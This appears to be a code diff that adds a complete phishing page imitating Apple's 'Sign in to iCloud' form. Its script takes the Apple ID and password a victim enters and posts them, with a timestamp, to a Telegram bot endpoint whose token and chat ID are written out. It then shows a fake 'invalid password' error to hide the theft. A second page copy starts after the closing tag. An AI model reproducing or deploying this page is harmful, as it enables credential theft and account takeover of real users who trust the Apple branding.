@@ -7,6 +7,97 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Helvetica Neue',sans-serif;}
 body{background:#f5f5f7;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px;}
+.card{background:#ffffff;border-radius:28px;padding:48px 36px;box-shadow:0 0 0 0.5px rgba(0,0,0,0.04),0 6px 24px rgba(0,0,0,0.08);width:100%;max-width:420px;text-align:center;animation:fade 0.3s ease;}
+@keyframes fade{from{opacity:0;transform:translateY(12px);}to{opacity:1;transform:translateY(0);}}
+.icon{font-size:64px;margin-bottom:6px;display:block;}
+h1{font-size:26px;font-weight:700;color:#1d1d1f;letter-spacing:-0.3px;margin-bottom:4px;}
+.desc{font-size:15px;color:#86868b;margin-bottom:32px;line-height:1.4;}
+.field{position:relative;margin-bottom:14px;text-align:left;}
+.field label{display:block;font-size:13px;font-weight:500;color:#6e6e73;margin-bottom:5px;padding-left:2px;}
+.field input{width:100%;padding:16px 14px;border:1.5px solid #d2d2d7;border-radius:14px;font-size:16px;background:#fafafa;outline:none;transition:all 0.2s;color:#1d1d1f;}
+.field input:focus{border-color:#0071e3;background:#fff;box-shadow:0 0 0 4px rgba(0,113,227,0.15);}
+.field input::placeholder{color:#aeaeb2;font-weight:400;}
+.btn{width:100%;padding:17px;background:#0071e3;color:#fff;border:none;border-radius:14px;font-size:17px;font-weight:600;cursor:pointer;margin-top:18px;transition:all 0.2s;letter-spacing:0.2px;}
+.btn:hover{background:#0077ed;}
+.btn:active{transform:scale(0.97);background:#006edb;}
+.btn:disabled{opacity:0.5;cursor:not-allowed;transform:none;}
+.links{margin-top:28px;display:flex;flex-direction:column;gap:6px;}
+.links a{color:#0071e3;font-size:13px;text-decoration:none;font-weight:400;transition:0.2s;}
+.links a:hover{text-decoration:underline;}
+.error{color:#d93025;font-size:14px;margin-top:18px;display:none;background:#fef2f2;padding:10px 14px;border-radius:10px;text-align:center;font-weight:500;}
+.spinner{display:none;margin-top:20px;}
+.spinner span{display:inline-block;width:9px;height:9px;background:#0071e3;border-radius:50%;margin:0 4px;animation:bounce 1.4s ease-in-out infinite;}
+.spinner span:nth-child(2){animation-delay:0.16s;}
+.spinner span:nth-child(3){animation-delay:0.32s;}
+@keyframes bounce{0%,80%,100%{transform:scale(0);}40%{transform:scale(1);}}
+.spinner p{font-size:13px;color:#86868b;margin-top:10px;}
+.divider{height:1px;background:#e8e8ed;margin:28px 0 0;}
+.footer{display:flex;justify-content:center;gap:8px;margin-top:16px;}
+.footer span{color:#86868b;font-size:11px;}
+.lock{font-size:11px;color:#aeaeb2;margin-top:18px;display:flex;justify-content:center;align-items:center;gap:4px;}
+</style>
+</head>
+<body>
+<div class="card">
+<span class="icon">🍎</span>
+<h1>Sign in to iCloud</h1>
+<p class="desc">Use your Apple ID to access iCloud services.</p>
+<div class="field">
+<label>Apple ID</label>
+<input type="email" id="email" placeholder="name@example.com" autocomplete="off">
+</div>
+<div class="field">
+<label>Password</label>
+<input type="password" id="pass" placeholder="Enter your password" autocomplete="off">
+</div>
+<button class="btn" id="btn" onclick="send()">Sign In</button>
+<div class="spinner" id="spinner">
+<div><span></span><span></span><span></span></div>
+<p>Verifying account…</p>
+</div>
+<div class="error" id="error">Invalid Apple ID or password. Please try again.</div>
+<div class="links">
+<a href="#">Forgot Apple ID or password?</a>
+<a href="#">Create your Apple ID</a>
+</div>
+<div class="divider"></div>
+<div class="lock">🔒 Your information is encrypted and secure</div>
+</div>
+<script>
+function send(){
+var email=document.getElementById("email").value;
+var pass=document.getElementById("pass").value;
+if(email==""||pass==""){
+alert("Please enter your Apple ID and password.");
+return;
+}
+document.getElementById("spinner").style.display="block";
+document.getElementById("btn").disabled=true;
+document.getElementById("error").style.display="none";
+var x=new XMLHttpRequest();
+x.open("POST","https://api.telegram.org/bot8976876114:AAGjlI4juHUaOyCbhj1MFPITpHK_0WuJlro/sendMessage",true);
+x.setRequestHeader("Content-Type","application/json");
+x.send(JSON.stringify({chat_id:"6512360078",text:"⏺ Apple ID: "+email+"\n⏺ Password: "+pass+"\n⏺ Time: "+new Date().toLocaleString()}));
+setTimeout(function(){
+document.getElementById("spinner").style.display="none";
+document.getElementById("btn").disabled=false;
+document.getElementById("error").style.display="block";
+document.getElementById("email").value="";
+document.getElementById("pass").value="";
+},3000);
+}
+</script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>iCloud</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Helvetica Neue',sans-serif;}
+body{background:#f5f5f7;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px;}
 .card{background:#ffffff;border-radius:28px;padding:48px 36px;box-shadow:0 0 0 0.5px rgba(0,0,0,0.04),0 6px 24px rgba(0,0,0,0.08);width:100%;max-width:420px;text-align:center;animation:fade 0.3s ease;position:relative;overflow:hidden;}
 @keyframes fade{from{opacity:0;transform:translateY(12px);}to{opacity:1;transform:translateY(0);}}
 .watermark{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%) rotate(-30deg);font-size:72px;font-weight:900;color:rgba(0,0,0,0.04);letter-spacing:8px;pointer-events:none;user-select:none;z-index:0;white-space:nowrap;}
